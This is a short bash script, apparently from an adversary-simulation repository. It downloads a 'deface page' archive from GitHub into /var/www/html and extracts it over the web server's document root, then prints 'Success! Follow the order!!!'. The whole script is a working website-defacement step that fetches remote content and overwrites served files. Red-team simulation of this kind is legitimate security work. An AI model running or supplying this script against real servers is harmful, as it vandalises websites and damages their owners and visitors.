#!/bin/bash

execute() {
    echo "Downloading deface page"
    wget -O /var/www/html/deface.tar.gz https://github.com/fareedfauzi/Adv_Sim/blob/main/deface.tar.gz
    tar -xzvf /var/www/html/deface.tar.gz -C /var/www/html/
    echo "Success! Follow the order!!!"
}
execute
